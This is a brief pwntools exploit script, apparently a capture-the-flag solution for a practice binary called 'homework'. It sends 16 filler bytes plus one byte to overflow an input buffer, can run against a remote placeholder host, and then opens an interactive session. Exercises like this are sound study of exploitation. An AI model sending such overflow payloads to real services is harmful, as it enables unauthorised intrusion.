#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("homework")

gs = '''
b *main+306
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

io = start()

io.recvuntil(b"Enter homework sol")
io.send(b"A"*16 + b'R')


io.interactive()
